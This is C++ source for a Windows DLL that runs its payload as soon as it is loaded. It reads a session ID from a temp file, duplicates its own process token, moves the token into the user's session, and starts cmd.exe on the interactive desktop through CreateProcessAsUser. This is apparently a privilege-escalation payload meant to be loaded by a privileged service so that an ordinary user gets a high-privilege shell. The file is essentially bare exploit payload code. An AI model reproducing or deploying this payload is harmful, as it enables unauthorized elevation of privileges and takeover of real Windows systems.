#include <windows.h>
#include <stdio.h>


class ScopedHandle
{
public:
	explicit ScopedHandle(HANDLE h) { _h = h; }
	ScopedHandle() : _h(nullptr) {}
	~ScopedHandle() {
		if (valid()) {
			CloseHandle(_h);
			_h = nullptr;
		}
	}

	PHANDLE ptr() {
		return &_h;
	}

	HANDLE get() {
		return _h;
	}

	bool valid() {
		return _h != nullptr && _h != INVALID_HANDLE_VALUE;
	}

private:
	HANDLE _h;
};

void write_error( const char *custom_err) {
	FILE *f;
	fopen_s(&f, "C:\\Windows\\Temp\\err.txt", "wb");
	fprintf(f, "ERROR: %d", GetLastError());
	if(custom_err != NULL)
		fprintf(f, "MSG: %s", custom_err);
	fclose(f);
}

DWORD get_session_id() {

	FILE *f;
	DWORD session_id = -1;
	char session_buf[30];
	char filename[] = { "C:\\Windows\\Temp\\sess.txt" };

	memset(session_buf, 0, 30);
	DWORD ret = fopen_s(&f, filename, "rb");
	if (ret == 0) {
		fread(session_buf, 1, 29, f);
		fclose(f);
		session_id = strtoul(session_buf, nullptr, 0);
		remove(filename);
	} else {
		write_error(0);
	}

	return session_id;
}

int main(int argc, char* argv[]) {
	char *zeros = (char *)calloc(1, 0x80);
	const char *cmd = "cmd.exe";

	DWORD session_id = get_session_id();
	if(session_id == -1)
		return 1;

	ScopedHandle token;
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, token.ptr()))
	{
		write_error("Open Token Failed.");
		return E_FAIL;
	}

	ScopedHandle dup_token;
	if (!DuplicateTokenEx(token.get(), TOKEN_ALL_ACCESS, nullptr, SecurityAnonymous, TokenPrimary, dup_token.ptr()))
	{
		write_error("Duplicate Token Failed.");
		return E_FAIL;
	}

	if (!SetTokenInformation(dup_token.get(), TokenSessionId, &session_id, sizeof(session_id)))
	{
		write_error("Set Token Info Failed.");
		return E_FAIL;
	}

	STARTUPINFO start_info = {};
	start_info.cb = sizeof(start_info);
	start_info.lpDesktop = (LPSTR)"WinSta0\\Default";


	DWORD ret = CreateProcessAsUser(dup_token.get(), nullptr, (LPSTR)cmd, nullptr,
		nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &start_info, (LPPROCESS_INFORMATION)zeros);
	

	//// Start the child process. 
	//DWORD ret = CreateProcess(NULL,   // No module name (use command line)
	//	(LPSTR)cmd,        // Command line
	//	NULL,           // Process handle not inheritable
	//	NULL,           // Thread handle not inheritable
	//	FALSE,          // Set handle inheritance to FALSE
	//	CREATE_NEW_CONSOLE,              // No creation flags
	//	NULL,           // Use parent's environment block
	//	NULL,           // Use parent's starting directory 
	//	(LPSTARTUPINFOA)&start_info,            // Pointer to STARTUPINFO structure
	//	(LPPROCESS_INFORMATION)zeros);
}

/*
 * Current DLL hmodule.
 */
static HMODULE dll_handle = NULL;

#ifdef _DBG

extern "C" __declspec (dllexport) void __cdecl RegisterDll(
	HWND hwnd,        // handle to owner window
	HINSTANCE hinst,  // instance handle for the DLL
	LPTSTR lpCmdLine, // string the DLL will parse
	int nCmdShow      // show state
) {
	//::MessageBox(0,lpCmdLine,0,0);
}

#endif

//===============================================================================================//
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	DWORD dwResult = 0;
	unsigned int ret = 0;

	switch (dwReason)
	{
	case DLL_PROCESS_ATTACH:
		dll_handle = (HMODULE)hinstDLL;
	
		main(0, nullptr);

	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}